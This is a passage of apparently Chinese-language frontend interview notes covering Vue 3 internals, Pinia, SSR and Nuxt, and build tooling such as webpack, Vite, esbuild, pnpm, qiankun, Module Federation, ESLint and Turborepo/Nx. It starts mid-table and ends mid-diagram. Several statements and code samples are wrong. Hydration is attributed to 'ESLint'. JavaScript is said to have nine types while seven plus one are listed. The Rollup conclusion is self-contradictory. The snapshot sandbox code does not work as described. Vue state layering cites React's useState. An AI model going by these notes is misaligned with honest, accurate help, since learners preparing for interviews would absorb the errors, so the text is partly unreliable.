| API | mutation/action/state/getter 四模块 | store(state + action + getter) |
| TypeScript | 需要手动类型声明 | 自动类型推导 |
| mutations | 同步变更，有 devtools 支持 | 无 mutation，action 即同步也异步 |
| 模块化 | modules（需手动 namespaced） | 每个 store 都是独立的，可自由组合 |
| 热更新 | 需要插件 | 原生支持 |
| 体积 | ~20KB | ~10KB |

```typescript
// Pinia 用法
export const useCounterStore = defineStore('counter', {
  state: () => ({ count: 0 }),
  getters: {
    double: (state) => state.count * 2
  },
  actions: {
    increment() { this.count++ },
    async fetchData() {
      const res = await api.get()
      this.count = res.data.count
    }
  }
})

const store = useCounterStore()
store.count++          // 直接修改
store.$patch({ count: 10 })
store.$reset()         // 重置
```

Pinia 的核心优势：**Composition API 风格 + 自动类型推导 + 更轻量**。

---

### 9.15 setup 为什么更强，Composition API 为什么出现

#### Options API 的问题

```vue
<!-- Vue2 Options API: 相关逻辑被拆分到各处 -->
<script>
export default {
  data() { return { count: 0 } },
  computed: { double() { return this.count * 2 } },
  methods: { increment() { this.count++ } },
  watch: { count(val) { console.log(val) } }
  // 问题：count 相关逻辑分散在 4 个地方
}
</script>
```

#### Composition API 的优势

```vue
<script setup>
import { ref, computed, watch } from 'vue'

const count = ref(0)
const double = computed(() => count.value * 2)
const increment = () => count.value++
watch(count, val => console.log(val))

// 复用：抽取为 composable
export function useCounter() {
  const count = ref(0)
  const double = computed(() => count.value * 2)
  return { count, double }
}
</script>
```

**三大优势**：
1. **逻辑复用**：mixin 有命名冲突、来源不明的问题，composable 函数清晰可控
2. **代码组织**：按功能而非选项类型组织大型组件代码
3. **类型推导**：更好的 TypeScript 支持

---

### 9.16 Vue3 为什么更快

1. **Proxy 响应式**：惰性代理，初始化快，内存占用低
2. **Block Tree**：diff 只遍历动态节点，跳过静态子树
3. **patchFlag**：精确标记动态类型，switch-case 快速分发
4. **静态提升**： hoistStatic 将静态节点提升到渲染函数外部，避免重复创建
5. **事件缓存**：静态事件 `onClick={handleClick}` 只创建一次
6. **v-memo**：跳过子树的更新
7. **Virtual DOM 重写**：整体比 Vue2 快约 50%

```
Vue2 更新一棵组件树：遍历所有节点 → O(N)
Vue3 更新一棵组件树：遍历 dynamicChildren → O(动态节点数 << N)
```

---

### 9.17 defineExpose / defineProps / defineEmits 原理

```vue
<!-- Parent.vue -->
<template>
  <Child ref="childRef" />
  <button @click="childRef.exposedMethod()">调用子组件方法</button>
</template>

<!-- Child.vue -->
<script setup>
const props = defineProps({ title: String, count: { type: Number, default: 0 } })
const emit = defineEmits(['update', 'delete'])

defineExpose({
  exposedMethod() { console.log('called') }
})
</script>
```

**原理**：
- `defineProps/defineEmits/defineExpose` 是编译器在编译 `<script setup>` 时识别的特殊编译器宏
- 编译后生成 `__sfc__` 元数据，供 devtools 和 HMR 使用
- 运行时它们是编译器宏，不是真正的函数调用

```javascript
// 编译后大概等价于：
const __sfc__ = {
  __name: 'Child',
  props: { title: String, count: { type: Number, default: 0 } },
  emits: ['update', 'delete'],
  setup(props, { emit }) {
    defineExpose({ exposedMethod })
    return () => h('div', props.title)
  }
}
```

---

### 9.18 Vue SSR 原理

#### 核心流程

```
浏览器请求页面
    │
    ├── Server: VueSSR.createApp(app).renderToString(context)
    │       ├── Vue组件树渲染 → 字符串拼接
    │       ├── 生成HTML（路由数据注入）
    │       └── 返回完整HTML给浏览器
    │
    └── 浏览器: 收到HTML → 显示首屏（可交互但未水合）
            ├── 加载JS bundle
            └── Client: hydrate(app, container)
                    └── 激活HTML中的DOM节点，建立响应式绑定
```

#### 关键API

```javascript
// server entry
import { createSSRApp } from 'vue'
import { renderToString } from 'vue/server-renderer'
import App from './App.vue'

export default function serverEntry(context) {
  const app = createSSRApp(App) // 必须用 createSSRApp
  return renderToString(app, context)
}

// client entry
import { createSSRApp } from 'vue'
const app = createSSRApp(App)
app.mount('#app', true) // hydrate模式挂载
```

#### hydrate（客户端水合）

ESLint遍历已存在的 DOM，通过 Virtual DOM 做一致性检查，对已有 DOM 建立 Vue 响应式绑定（事件监听、数据劫持），这个过程叫"水合"（Hydration），不重新创建 DOM。

---

### 9.19 Nuxt 原理

```
Nuxt = Vue 3 + Vite/Webpack + SSR + File-based routing
       + 自动导入 + SEO优化 + 路由守卫抽象

目录约定：
  pages/          → 自动生成路由
  components/     → 自动导入
  composables/    → 自动导入
  plugins/        → SSR友好的插件
  server/         → Nitro后端服务

请求流程（SSR模式）：
  1. 路由匹配（pages/ 文件树）
  2. 加载组件 + 执行 asyncData/useFetch
  3. createSSRApp + renderToString
  4. HTML返回浏览器
  5. 浏览器下载JS，hydrate
```

**Nuxt3 vs Nuxt2**：Nuxt3 基于 Vue3 Composition API + Nitro（支持 serverless）+ 自动导入（零配置）。

---

### 9.20 Vue 权限管理

#### 路由守卫方案

```javascript
router.beforeEach(async (to, from, next) => {
  const { role } = useUserStore()

  if (to.meta.requiresAuth && !isLogin()) return next('/login')
  if (to.meta.roles && !to.meta.roles.includes(role)) return next('/403')
  next()
})

// 动态路由注册
async function generateRoutes() {
  const menus = await fetchMenus()
  const routes = menus.map(menu => ({
    path: menu.path,
    component: () => import(`@/views/${menu.component}`),
    meta: { title: menu.title, roles: menu.roles }
  }))
  routes.forEach(r => router.addRoute(r)) // 运行时注册
}
```

#### 指令方案（按钮级权限）

```javascript
const permission = {
  mounted(el, binding) {
    const { value } = binding
    const roles = useUserStore().roles
    if (value && !roles.includes(value)) {
      el.parentNode?.removeChild(el)
    }
  }
}

app.directive('permission', permission)

// 使用
<button v-permission="'admin'">删除</button>
```

---

### 9.21 Vue 大型项目架构

```
src/
├── apps/              # 多应用入口
├── packages/         # 内部共享包（monorepo）
│   ├── ui/           # 组件库
│   ├── utils/        # 工具函数
│   ├── hooks/        # 组合式函数
│   └── constants/    # 常量
├── layouts/          # 布局组件
├── pages/             # 页面（按业务域分组）
├── router/            # 路由配置
├── store/             # 状态管理（Pinia）
├── services/          # API 封装
├── composables/       # 全局 composable
├── directives/        # 全局指令
├── plugins/           # Vue 插件
└── assets/            # 静态资源
```

**状态管理分层**：
- 页面级状态：组件内 `useState`
- 跨页面共享：Pinia store
- 服务端数据：loadData / route params

---

## Chapter 10: 工程化终极题库

### 10.1 webpack 原理（依赖图 + module/compilation/chunk + plugin机制 + Tapable）

#### 核心概念

```
webpack 入口 → 分析依赖图 → 打包成 chunk → 输出 bundle

Entry (入口) → 解析模块
  │
  ├── 递归分析 import/require → module
  ├── loader 处理非JS模块（ts, css, img等）
  └── 合并多个 module → chunk（按 splitChunks 规则）
          │
          └── 生成 bundle（JS文件或代码分割后的分片）
```

#### 构建流程

```
webpack CLI 启动
    │
    ├── 1. 初始化：合并配置文件
    │
    ├── 2. 编译（Compiler.run）：
    │       ├── 创建 Compilation 对象
    │       ├── entry 模块 → 从文件读取 → 得到 module
    │       ├── 分析 import/require → 递归处理依赖
    │       ├── 应用 loader（use 数组，从右到左）
    │       ├── 生成 chunk（图关系）
    │       ├── 调用 plugin（emit 钩子）
    │       └── 输出文件到 dist
    │
    └── 3. 完成
```

#### module / compilation / chunk 关系

```
module    : 每个源文件被解析后的对象（Source → AST → 编译后）
compilation : 某一次编译过程中的所有 module 和 chunk 集合
chunk     : 打包产物分组（由 entry / splitChunks / dynamic import 生成）
             ├── entry chunk（入口 chunk，包含 runtime）
             ├── async chunk（按需加载的异步 chunk）
             └── vendor chunk（第三方库 chunk）
bundle    : 最终输出文件（一个 chunk 对应一个 bundle）
```

#### plugin 机制（Tapable 钩子系统）

```javascript
const { SyncHook, AsyncSeriesHook } = require('tapable')

class MyPlugin {
  apply(compiler) {
    compiler.hooks.emit.tap('MyPlugin', (compilation) => {
      console.log('编译中...', Object.keys(compilation.assets))
    })

    compiler.hooks.emit.tapAsync('MyPlugin', (compilation, callback) => {
      setTimeout(() => { callback() }, 100)
    })

    compiler.hooks.compilation.tap('MyPlugin', (compilation) => {
      compilation.hooks.optimizeChunkAssets.tap('MyPlugin', (chunks) => {})
    })
  }
}
```

**Tapable 钩子类型**：
| 类型 | 行为 |
|------|------|
| SyncHook | 同步串行 |
| SyncBailHook | 同步，返回非undefined时停止 |
| SyncWaterfallHook | 同步，上一个返回值作为下一个输入 |
| AsyncParallelHook | 异步并行（Promise.all）|
| AsyncSeriesHook | 异步串行（await）|

---

### 10.2 Vite 为什么快

#### 核心对比：webpack vs Vite

```
webpack Dev Server:
  启动 → 递归构建整个依赖图（可能数千个模块）
          → 构建时间长（秒级到分钟级）
          → 修改 → 重新构建

Vite Dev Server:
  启动 → 启动Dev Server（秒级）
          → 按需编译（浏览器请求时才编译单个文件）
          → 修改 → HMR只更新改动的模块（毫秒级）
```

#### ESM Dev Server（无Bundle）

```
浏览器请求: GET /src/main.ts
    │
    ├── Vite Server 拦截请求
    ├── 解析 import（裸导入：'vue'）
    │       └── 转换为本地路径
    ├── 替换 import.meta.url
    ├── 注入 HMR 运行时
    ├── 处理 TypeScript/JSX（esbuild，ms级）
    └── 返回 ES Module（浏览器直接执行）

// 浏览器收到多个小文件，而不是一个巨大bundle
// 浏览器利用 HTTP2 multiplexing 并行加载
```

#### HMR 流程

```
文件修改
    │
    ├── Vite 监听到变化（fs.watch）
    │
    ├── 重新编译改动的模块（esbuild，ms级）
    │
    ├── 向浏览器推送 HMR 事件（WebSocket）
    │
    └── 浏览器端 HMR Runtime 接管：
            ├── 接受 hot.accept(['./module'], callback)
            ├── 根据边界更新受影响的模块
            └── 更新后重新执行 render（通常 < 50ms）
```

Vite 不需要 bundle 的原因：现代浏览器原生支持 ESM，Vite 直接利用浏览器的能力分发模块，只在必要时编译单个文件。

---

### 10.3 ESBuild 为什么快

```
ESBuild 为什么比 ts-loader/babel-loader 快 10-100倍？

1. Go语言编写 → 编译为机器码，单进程多线程
   JavaScript（Babel/ts-loader）→ V8引擎解释执行

2. 完全兼容 Go 运行时内存模型
   - 无需 AST 在进程间传递
   - 无需序列化/反序列化

3. 无需 AST traversal
   - Babel: parse → traverse → transform → generate（多次遍历AST）
   - ESBuild: 一次遍历，同时完成解析和写入
   - 内存访问局部性极好

4. 从零编写解析器，非复用通用工具
   - 针对 JavaScript/TypeScript 定制的轻量解析器

Benchmarks（官方）：
  esbuild:    3.98s（编译30000个文件）
  rollup:     31.6s
  webpack:    47.7s
```

**ESBuild 的限制**：
- 不支持类型检查（需要 tsc --noEmit 配合）
- 不支持装饰器旧语法（需 babel）
- 不支持自定义 AST 转换（babel 的灵活性无法替代）

---

### 10.4 Rollup vs webpack 区别

| 特性 | webpack | Rollup |
|------|---------|--------|
| 定位 | 应用打包（development + production） | 库打包 |
| HMR | 完善 | 不支持 dev server HMR |
| 产物 | bundle（所有模块打包进一个/少数文件） | flat bundle（tree-shaking 效果最好）|
| tree-shaking | 支持但不够彻底（commonjs需额外配置） | 完美支持 ESM静态分析 |
| 插件生态 | 极其丰富 | 较少 |
| 输出格式 | IIFE/CJS/ESM/UMD | CJS/ESM/IIFE/UMD |
| chunk 分割策略 | 复杂但强大 | 简洁 |

```javascript
// Rollup 打包产物示例（天然 ESM，tree-shaking 完美）
// 输入：两个 ESM 模块，导出10个函数，只用3个
// 输出：只有3个函数及其依赖的代码（未使用的完全移除）

export default {
  input: 'src/index.js',
  output: {
    format: 'esm',
    file: 'dist/index.mjs',
    sourcemap: true
  },
  plugins: [resolve(), commonjs(), terser()]
}
```

**结论**：生产环境用 Vite（基于 esbuild 开发 + Rollup 生产构建），开发环境用 Vite（基于 esbuild + 原生 ESM）。

---

### 10.5 loader vs plugin 区别

| 维度 | loader | plugin |
|------|--------|--------|
| 处理阶段 | module 转换（文件→JS字符串） | 整个构建生命周期 |
| 执行时机 | 匹配文件路径时，链式调用 | 钩子回调（compiler/compilation） |
| 数量 | 处理单文件（链式，一个接一个） | 处理编译过程 |
| 接口 | `source → (loader pipeline) → JS string` | `apply(compiler) { compiler.hooks.xxx.tap(...) }` |
| 用途 | ts-loader, css-loader, vue-loader | HtmlWebpackPlugin, MiniCssExtractPlugin |

```javascript
// loader 示例：CSS 转换链
// css-loader: CSS → JS module（导出为字符串）
// style-loader: JS module → <style>标签注入DOM

// plugin 示例：生成报告
class BuildReportPlugin {
  apply(compiler) {
    compiler.hooks.done.tap('BuildReportPlugin', (stats) => {
      const { assets, modules } = stats.toJson({ assets: true, modules: true })
      console.log(`生成 ${assets.length} 个文件，共 ${modules.length} 个模块`)
    })
  }
}
```

---

### 10.6 AST 原理（parser → traverser → transformer → generator）

```
源代码
    │
    ├── 1. Parser（解析）
    │       source code → Token 流（词法分析）
    │       Token 流 → AST（语法分析）
    │
    ├── 2. Traversal（遍历）
    │       AST → 访问每个节点（enter/exit）
    │       visitor = {
    │         CallExpression: { enter(node) {}, exit(node) {} }
    │       }
    │
    ├── 3. Transformer（转换）
    │       遍历过程中修改/替换 AST 节点
    │       Example: 把 require('fs') 替换为 ESM import
    │
    └── 4. Generator（生成）
            新 AST → 目标代码（toCode）
```

```javascript
const acorn = require('acorn')
const { traverse } = require('ast-traverse')

const code = 'const add = (a, b) => a + b'
const ast = acorn.parse(code, { ecmaVersion: 2020 })

traverse(ast, {
  enter(node) {
    if (node.type === 'ArrowFunctionExpression') {
      console.log('发现箭头函数')
    }
  }
})
```

---

### 10.7 Babel 编译流程

```
Babel 编译流程：

源代码
    │
    ├── @babel/parser（Babylon）
    │       → AST（符合 ESTree 规范）
    │
    ├── @babel/traverse
    │       → 遍历 AST（使用 visitor 模式）
    │       → 收集依赖、调用 plugin/preset 进行节点转换
    │
    ├── @babel/template
    │       → 从字符串模板生成 AST 节点
    │
    └── @babel/generator
            → 新 AST → 目标代码 + sourcemap

preset = plugin 集合（@babel/preset-env = 所有现代语法转换 plugin 的集合）
plugin 优先级高于 preset，plugin 按顺序执行
```

```javascript
const babel = require('@babel/core')

const result = babel.transformSync(code, {
  filename: 'input.js',
  presets: ['@babel/preset-env'],
  plugins: [function() {
    return {
      visitor: {
        VariableDeclaration(path) {
          path.node.kind = 'let' // const → let
        }
      }
    }
  }]
})
```

---

### 10.8 source map 原理

```
bundle.js 末尾注释：
  //# sourceMappingURL=index.js.map

index.js.map 文件（JSON）：
{
  "version": 3,
  "sources": ["index.js"],
  "names": ["a", "b", "add"],
  "mappings": "AAAA,SAASC",  // VLQ编码的位置映射

  "sourcesContent": ["const a = 1\nconst b = 2\n..."]
}

// 浏览器 DevTools：source map → 断点停在源码
// VLQ（Variable Length Quantity）：用 base64 编码节省体积
```

**webpack 配置**：
```javascript
module.exports = {
  devtool: process.env.NODE_ENV === 'production'
    ? 'source-map'        // 最完整，单独文件
    : 'eval-cheap-module-source-map'  // 开发：快速，包含行号
}
```

---

### 10.9 tree shaking 原理（ESM静态分析 + usedExports + sideEffects）

```
tree shaking = 消除未使用的导出（Dead Code Elimination）

前提条件：
  1. ESM 静态分析（import/export 在模块顶层，编译时确定依赖）
  2. bundler 收集每个模块的 export 使用情况
  3. 递归追踪：从 entry 出发，标记用到的导出，删除未标记的

ESM vs CommonJS：
  ESM:   import { a } from './lib' → 静态分析可行
  CJS:   const lib = require('./lib') → 运行时才能确定
```

```
Tree Shaking 流程（webpack）：

编译阶段：
  1. 分析 import/export（静态，不执行代码）
  2. 确定模块依赖图

标记阶段（usedExports）：
  3. 从 entry 开始，递归标记被使用的导出
  4. 未标记的导出标记为 unused export

删除阶段（sideEffects）：
  5. 遍历标记后的 AST，删除未使用的声明
```

```javascript
// package.json
{
  "sideEffects": [
    "*.css",         // CSS 不 tree shake
    "./src/polyfill.js" // 有副作用的文件
  ]
  // 或设为 false：所有文件都视为无副作用
}

// webpack 配置
module.exports = {
  optimization: {
    usedExports: true,
    sideEffects: true,
  }
}
```

---

### 10.10 HMR 原理（webpack-dev-server + WebSocket + HMR Runtime）

```
HMR 完整流程：

文件变化
    │
    ├── webpack-dev-server 监听文件变化（chokidar）
    │
    ├── 重新编译变化的文件及其依赖链
    │       （增量编译，比全量快很多）
    │
    ├── 通过 WebSocket 通知浏览器
    │       → { type: 'ok', data: { modules: ['./module.js'] } }
    │
    └── 浏览器端 HMR Runtime 接管：
            ├── hotCheck() → 比较模块版本
            ├── 找到模块的父依赖链
            ├── 调用 hot.accept(['module'], callback)
            │       执行模块更新 + 回调
            ├── 若父模块无法接受（无 accept），向上冒泡
            │       直到找到接受者或到达 entry
            │       若均不接受 → 整页刷新
            └── 自底向上更新：子模块 → 父模块 → 视图
```

**Vite vs webpack HMR**：
- webpack HMR：webpack-dev-server 重新编译 → WebSocket推送 → 浏览器执行 accept 回调
- Vite HMR：esbuild 重新编译单个文件（ms级）→ WebSocket推送 → 浏览器替换对应模块

---

### 10.11 code splitting 原理 + chunk vs bundle 区别

```
code splitting = 将代码按需分割为多个 chunk（减少初始加载体积）

分割策略：
  1. 入口分割：每个 entry → 一个 chunk
  2. 动态 import：() => import('./chunk.js') → 异步 chunk
  3. splitChunks：提取公共依赖（node_modules → vendor）
```

```javascript
// 动态 import（自动生成异步 chunk）
const Home = () => import('./views/Home.vue')

// webpack 配置 splitChunks
module.exports = {
  optimization: {
    splitChunks: {
      chunks: 'all',
      minSize: 20000,
      cacheGroups: {
        vendors: {
          test: /[\\/]node_modules[\\/]/,
          name: 'vendors',
          priority: -10,
          reuseExistingChunk: true
        },
        common: {
          minChunks: 2,
          priority: -20,
          reuseExistingChunk: true
        }
      }
    }
  }
}
```

#### chunk vs bundle

| 维度 | chunk | bundle |
|------|-------|--------|
| 概念 | 编译时的代码分组逻辑 | 最终输出的文件 |
| 生成 | 由 webpack 根据 split 规则生成 | 由 chunk 生成 |
| 关系 | chunk 是 bundle 的中间态 | 一个或多个 chunk 组合成一个 bundle |
| 类型 | entry chunk, async chunk, runtime chunk | JS/CSS/HTML bundle |

```
编译产物：
  dist/
    ├── main.js         ← main bundle（来自 entry chunk）
    ├── vendors.js      ← vendor chunk bundle（splitChunks 生成）
    └── Home.abc123.js  ← 异步 chunk bundle（dynamic import 生成）
```

---

### 10.12 webpack 优化

#### splitChunks

```javascript
splitChunks: {
  chunks: 'all',
  cacheGroups: {
    defaultVendors: {
      test: /[\\/]node_modules[\\/]/,
      priority: -10,
      reuseExistingChunk: true,
      name: 'vendors'
    },
    common: {
      minChunks: 2,
      priority: -20,
      reuseExistingChunk: true
    }
  }
}
```

#### tree shaking + terser

```javascript
optimization: {
  usedExports: true,
  sideEffects: true,
  minimizer: [
    new TerserPlugin({
      terserOptions: {
        compress: {
          drop_console: true,
          drop_debugger: true
        }
      }
    })
  ]
}
```

#### babel-loader 优化

```javascript
{
  loader: 'babel-loader',
  options: {
    cacheDirectory: true, // 缓存编译结果（提速50%+）
    cacheCompression: false
  }
}
```

#### 持久化缓存

```javascript
module.exports = {
  cache: {
    type: 'filesystem',  // webpack5 文件系统缓存
    buildDependencies: { config: [__filename] }
  }
}
// 二次构建：只重新编译变化的模块，其他从缓存恢复
```

#### thread-loader（多进程编译）

```javascript
{
  test: /\.js$/,
  use: [
    {
      loader: 'thread-loader',
      options: { workers: 4 }
    },
    'babel-loader'
  ]
}
```

---

### 10.13 pnpm 为什么快（硬链接 + 内容寻址存储）

```
pnpm vs npm/yarn 磁盘模型：

npm/yarn（扁平化）：
  node_modules/
    vue/
    lodash/
    lodash-es/
  → 同一库的不同版本各存一份，占用大量磁盘

pnpm（非扁平化 + 内容寻址存储）：
  .pnpm/
    vue@3.0.0/node_modules/vue/   ← 全局唯一存储（内容寻址）
    lodash@4.17.0/node_modules/lodash/
  项目 node_modules/
    vue → hardlink → .pnpm/vue@3.0.0/node_modules/vue/
    lodash → hardlink → .pnpm/lodash@4.17.0/node_modules/lodash/

硬链接原理：
  - 文件系统 inode 引用，同一物理文件多个路径
  - 删除一个硬链接，其他硬链接仍存在（引用计数>0）
  - 不复制文件内容，创建硬链接几乎是 O(1) 操作

pnpm 安装流程：
  1. 检查 store（~/.pnpm-store）是否有目标包
  2. 有 → 立即创建硬链接（秒级）
  3. 无 → 下载 → 存入 store → 创建硬链接
```

```
npm install vs pnpm install（node_modules/ 大时差距巨大）：

npm:  每次都从 registry 下载 + 大量文件 IO 解压
      → 速度慢 3-10 倍

pnpm: 硬链接复用全局 store
      → 安装速度极快
      → 磁盘占用极小（全局只存一份）
```

---

### 10.14 npm / yarn / pnpm 区别

| 特性 | npm | yarn | pnpm |
|------|-----|------|------|
| 安装速度 | 慢 | 中 | 快（硬链接）|
| 磁盘占用 | 大（重复存储） | 中 | 小（内容寻址）|
| 幽灵依赖 | 有（扁平化） | 有 | 无（非扁平化）|
| lock文件 | package-lock.json | yarn.lock | pnpm-lock.yaml |
| monorepo | npm workspaces v7+ | yarn workspaces | pnpm workspaces |

```bash
# pnpm workspaces
# pnpm-workspace.yaml
packages:
  - 'packages/*'
```

---

### 10.15 CI/CD 与 Git rebase vs merge

#### CI/CD

```
CI (Continuous Integration)：
  - 每次 push 自动运行：lint → test → build
  - 工具：GitHub Actions, GitLab CI, Jenkins, CircleCI

CD (Continuous Deployment/Delivery)：
  - CI 通过后自动部署到测试/生产环境
  - 工具：GitHub Actions + AWS/GCP, ArgoCD

流程：
  push → GitHub Actions → lint + test → build
                                        ↓
                                  通知（Slack/钉钉）
                                        ↓
                                  自动部署到 Staging
                                        ↓
                                  人工审批（可选）
                                        ↓
                                  自动部署到 Production
```

#### Git rebase vs merge

```
A---B---C  (feature)
     \
      D---E  (main)

merge:
  git checkout main && git merge feature
  结果：A---B---C---D---E---(merge commit)
  优点：保留完整分支历史
  缺点：提交历史可能混乱

rebase:
  git checkout feature && git rebase main
  结果：A---B---D---E---C'（C被重新应用在E之上）
  优点：提交历史线性、清晰
  缺点：重写提交（不要对已推送的提交 rebase！）

原则：
  - 本地分支 → 可以 rebase（整理提交历史）
  - 已推送的共享分支 → 只 merge
  - squash merge：git merge --squash → 将多个提交压缩为一个
```

---

### 10.16 Docker 为什么流行

```
Docker = 容器化技术，轻量级虚拟化

解决的问题：
  1. 环境一致性问题："在我机器上能跑" → 开发/测试/生产一致
  2. 快速启动：虚拟机（分钟级）vs Docker（秒级）
  3. 资源隔离：CPU/内存/网络/文件系统隔离

核心概念：
  Image（镜像）: 只读模板（类比：类）
  Container（容器）: Image 的运行实例（类比：对象）
  Dockerfile: 构建镜像的指令文件
  Registry: 镜像仓库（Docker Hub、私有registry）
```

```dockerfile
FROM node:18-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .
EXPOSE 3000
CMD ["node", "server.js"]
```

```bash
docker build -t my-app:1.0 .
docker run -p 3000:3000 my-app:1.0
docker push my-registry.com/my-app:1.0
```

**容器编排**：Docker Compose（单机多容器）→ Kubernetes K8s（生产级大规模集群管理）。

---

### 10.17 微前端是什么 + qiankun 原理

```
微前端 = 将微服务架构思想应用到前端
  → 多个独立的前端应用（子应用）→ 组合为一个完整应用

解决的问题：
  1. 大型项目的团队自治（各团队独立开发/部署）
  2. 技术栈无关（React/Vue/Angular 混用）
  3. 增量升级（逐步迁移 legacy 代码）
  4. 独立部署
```

#### qiankun 架构

```
┌─────────────────────────────────────────┐
│           主应用 (Main App)              │
│  ┌─────────┐  ┌─────────┐  ┌─────────┐ │
│  │ Vue 3   │  │ Vue 2   │  │  React  │ │
│  │ 子应用  │  │ 子应用  │  │  子应用 │ │
│  └────┬────┘  └────┬────┘  └────┬────┘ │
│       │            │            │       │
│  ┌────┴────────────┴────────────┴────┐ │
│  │        qiankun沙箱（JS隔离）        │ │
│  │   + Shadow DOM（样式隔离）           │ │
│  └───────────────────────────────────┘ │
└─────────────────────────────────────────┘
```

#### 沙箱机制

```javascript
// 快照沙箱（子应用修改 window，切换时快照/恢复）
class SnapshotSandbox {
  constructor() {
    this.modifyMap = {}
  }
  mount() {
    Object.keys(this.modifyMap).forEach(key => {
      window[key] = this.modifyMap[key]
    })
  }
  unmount() {
    this.modifyMap = { ...window }
  }
}

// 代理沙箱（ES Proxy，每个子应用有独立的 proxy window）
class ProxySandbox {
  constructor() {
    const proxyWindow = new Proxy({}, {
      get(target, key) { /* 优先取 proxy */ },
      set(target, key, value) { /* 写到自己 */ }
    })
  }
}

// 样式隔离：
// 1. Shadow DOM（attachShadow({ mode: 'open' })）
// 2. CSS Modules（类名加 hash）
// 3. BEM 规范前缀
```

#### 主应用注册子应用

```javascript
import { registerMicroApps, start } from 'qiankun'

registerMicroApps([
  {
    name: 'react-app',
    entry: '//localhost:3000',
    container: '#subapp',
    activeRule: '/react',
    props: { name: 'main app' }
  },
  {
    name: 'vue-app',
    entry: '//localhost:8080',
    container: '#subapp',
    activeRule: '/vue'
  }
])

start({ prefetch: 'all', singular: true })
```

---

### 10.18 Module Federation 原理（webpack5）

```
Module Federation = webpack5 内置的微前端/微模块方案
  → 允许在运行时从远程构建加载模块（无需构建时依赖）

架构：
  ┌──────────────┐      ┌──────────────────┐
  │  Host (主应用) │ ──→ │ Remote (远程构建) │
  │              │      │                  │
  │ import('     │      │ exposes: {        │
  │   "remote/   │      │   './Button':     │
  │    Button'   │      │   './Button'      │
  │ ')           │      │ }                 │
  │              │      │                  │
  │ shared: [    │ ←←←← │ shared: [        │
  │   'vue'      │ 共享  │   'vue'           │
  │ ]            │ 单例  │ ]                │
  └──────────────┘      └──────────────────┘

// Host 配置
new ModuleFederationPlugin({
  name: 'host',
  remotes: {
    remote_app: 'remote_app@http://localhost:3001/remoteEntry.js'
  },
  shared: ['vue']
})

// Remote 配置
new ModuleFederationPlugin({
  name: 'remote_app',
  filename: 'remoteEntry.js',
  exposes: {
    './Button': './src/Button.vue'
  },
  shared: ['vue']
})
```

**Module Federation vs qiankun**：
- qiankun：运行在主应用框架内，需要注册子应用，框架无关但需要适配
- MF：webpack 原生支持，无需框架适配，直接 import 远程模块

---

### 10.19 ESLint 原理（AST遍历 + 规则检测）

```
ESLint 工作流程：

源代码
    │
    ├── 1. Parser（解析）
    │       → ESPree → AST
    │       → 支持 TypeScript/JSX 等（@typescript-eslint/parser）
    │
    ├── 2. Linter.lint()（执行）
    │       ├── FlatConfig 或 .eslintrc.js 配置
    │       ├── 加载 plugin/rule
    │       └── 遍历 AST，调用各规则检测
    │
    └── 3. 报告违规
            └── { ruleId, message, line, column, severity }
```

```javascript
// 自定义 ESLint 规则
module.exports = {
  meta: {
    docs: { description: '禁止使用 console' },
    fixable: 'code'
  },
  create(context) {
    return {
      CallExpression(node) {
        if (
          node.callee.type === 'MemberExpression' &&
          node.callee.object.name === 'console'
        ) {
          context.report({
            node,
            message: '禁止使用 console，请使用 logger',
            fix(fixer) {
              return fixer.replaceText(node, 'logger.log()')
            }
          })
        }
      }
    }
  }
}
```

ESLint 使用 visitor 模式遍历 AST，规则对象中声明的每个 key 对应一种 AST 节点类型，遍历到该类型节点时调用对应函数。

---

### 10.20 husky / lint-staged

```
Git Hooks = Git 操作触发自定义脚本（pre-commit, commit-msg, pre-push等）

husky = 在项目中自动配置 Git Hooks
lint-staged = 只对暂存区（staged）文件执行检查

流程：
  git commit → pre-commit hook 触发
              → lint-staged 读取 staged 文件列表
              → 对每个文件执行: eslint --fix
              → 若失败 → commit 被阻止
              → 若成功 → commit 完成
```

```bash
# 安装（v8+）
npm install -D husky lint-staged
npx husky install
npx husky add .husky/pre-commit "npx lint-staged"
```

```json
{
  "lint-staged": {
    "*.{js,vue,ts}": ["eslint --fix", "prettier --write"],
    "*.{css,scss}": ["stylelint --fix"],
    "*.md": ["markdownlint --fix"]
  }
}
```

---

### 10.21 Turborepo / Nx（任务编排 + 增量构建 + 缓存）

```
问题背景：
  大型 monorepo 中有数十个包
  每次构建都需要重新构建所有包 → 慢

解决方案：任务编排 + 智能缓存
```

#### Turborepo（Vercel 出品）

```
Turborepo = 任务管道编排器 + 智能缓存

核心思想：
  1. 定义任务依赖图（哪些任务先执行，哪些可并行）
  2. 缓存构建结果（基于文件hash）
  3. 增量构建（只重新构建受影响的包）
```

```json
// turbo.json
{
  "pipeline": {
    "build": {
      "dependsOn": ["^build"],
      "outputs": ["dist/**", ".next/**"]
    },
    "test": {
      "dependsOn": ["build"]
    },
    "lint": {
      "cache": true
    }
  }
}
```

缓存命中时：git push → GitHub Actions → Turbo 从远端缓存拉取 → 秒级完成。

#### Nx（Nrwl 出品）

```
Nx = 更强大的任务编排 + 依赖分析 + 可视化

与 Turborepo 的区别：
  1. 内置图形化 dashboard（nx graph）：可视化项目依赖图
  2. 更细粒度的受影响分析（affected:build, affected:test）
  3. 内置 ESLint/Prettier/Storybook/cypress 集成
  4. 分布式缓存（Nx Cloud，支持团队共享）

affected 流程（只构建测试受git变更影响的包）：
  git diff HEAD~10 → 分析受影响的包
  nx affected:build → 只构建/测试受影响的包
```

```
Nx / Turborepo 架构对比：

Nx:
  ┌────────────┐
  │  Project   │  ← Nx 理解项目依赖图
  │  Graph     │
  └─────┬──────┘
        ├── 自动推断构建顺序
        ├── affected: only rebuild what changed
        ├── 缓存：本地 + Nx Cloud（分布式）
        └── nx graph → 生成项目依赖可视化

Turborepo:
  turbo.json 定义 pipeline
        ├── 任务拓扑排序（基于 dependsOn）
        ├── 远程缓存（Vercel Remote Cache）
        └── 增量构建
```

两者共同目标：**将大型 monorepo 的"全量构建"变为"增量构建"，从分钟级降至秒级**。

## 三、JavaScript 超高频八股

> JavaScript 是前端工程师的核心技能，本章覆盖高频面试题，从数据类型到异步编程全面覆盖。

---

### 1. 数据类型

#### 1.1 七种基本类型 vs 引用类型

JavaScript 共9种数据类型，分为两大类：

```
数据类型分类：
┌──────────────────────────────────────────────────┐
│                   数据类型                        │
├─────────────────────┬────────────────────────────┤
│  原始类型（7种）      │  引用类型（1种）              │
├─────────────────────┼────────────────────────────┤
│  number             │  object                    │
│  string             │    ├─ plain object        │
│  boolean            │    ├─ array               │
│  undefined          │    ├─ function            │
│  null               │    ├─ date                │
